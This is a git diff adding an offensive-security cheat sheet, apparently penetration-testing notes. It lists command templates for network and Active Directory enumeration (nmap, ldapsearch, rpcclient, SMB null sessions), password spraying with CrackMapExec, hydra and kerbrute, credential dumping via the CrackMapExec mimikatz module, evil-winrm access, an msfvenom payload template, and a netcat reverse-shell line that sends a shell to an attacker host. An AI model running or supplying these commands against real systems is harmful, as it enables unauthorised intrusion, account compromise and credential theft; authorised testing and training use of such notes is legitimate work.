@@ -1,0 +1,108 @@
+-----------------
+Enumeration Scans
+-----------------
+
+#Initial nmap
+nmap target
+nmap -sV -sC -p 0-65535 -oA ./nmap-initial <ip>
+
+#LDAP
+ldapsearch -h [LDAP Host]
+ldapsearch -x -b '[search_base]' -h [LDAP Host]
+ldapsearch -h [LDAP Host] -x -b '[search base]' '(objectClass=Person)' sAMAccountName | grep sAMAccountName | awk '{print $2}'
+
+#RPC
+rpcdump.py -p [Port] [Target IP]
+rpcclient -U '' [Target IP]
+
+#CackMapExec
+crackmapexec {http,winrm,smb,ssh,mssql}
+crackmapexec smb [Target CIDR]
+crackmapexec smb [Target IP/CIDR] --pass-pol -u '' -p ''
+crackmapexec smb [Target IP] -u [Username] -p [Password]
+crackmapexec smb [Target IP] -u [userlist] -p [pwlist]
+crackmapexec smb [Target IP] --pass-pol -u [userlist] -p [pwlist]
+crackmapexec smb [Target IP/CIDR] -u [Username] -p [Password] -M mimikatz
+
+#Remote Shares
+showmount -e [Target IP]
+sudo mount -t nfs [Target IP]:/[Remote Share] [Local Mount Point]
+
+#Samba/SMB Enumeration
+nmblookup -A target
+smbclient //MOUNT/share -I target -N
+rpcclient -U "" target
+enum4linux target
+enum4linux -a target-ip *do everything*
+nbtscan target
+
+#SMB Fingerprint
+smbclient -L //target
+
+#Open Shares
+nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p[port] target 
+
+#SMB Users
+nmap -sU -sS --script=smb-enum-users -p U:[port],T:[port] target
+
+#Null Session Testing
+net use \\TARGET\IPC$ "" /u:""
+smbclient -L //target
+
+------------------
+Poking and forcing
+------------------
+
+#Password Tools
+spray.sh -smb [targetIP] [usernameList] [passwordList] [AttemptsPerLockoutPeriod] [LockoutPeriodInMinutes] [Domain] [OptionalSkipUsernameUsernameSpray]
+hydra -L usernames.txt -P passwords.txt [Target IP]
+
+#Kerbrute
+python kerbrute.py -user [Userlist] -password [Pwlist] -domain [Domain] -dc-ip [DC IP]
+
+------------------------
+Connecting to the target
+------------------------
+
+#SSH
+ssh [user]@[Target IP]
+
+#SSH Tunnel
+ssh -L [Local Port]:[Target IP]:[Target Port] 
+
+#FTP
+ftp [Target IP]
+
+#FTP Anonymous
+ftp [Target IP]
+	USERNAME: Anonymous
+	PASSWORD: Anonymous
+
+#WinRM
+evil-winrm -i [Target IP] -u [USER]
+
+-----
+Shell
+-----
+
+#NETCAT
+/bin/sh | nc ATTACKING-IP 80
+
+-------------
+File Transfer
+-------------
+
+#SCP
+scp [Username]@[Target IP]:/[File Source] /[File Destination]
+
+#HTTP
+python -m SimpleHTTPServer [local port]
+
+--------
+MSFVENOM
+--------
+
+msfvenom -p payload LHOST= LPORT= -f format -o <filename.extension>
+
+
+
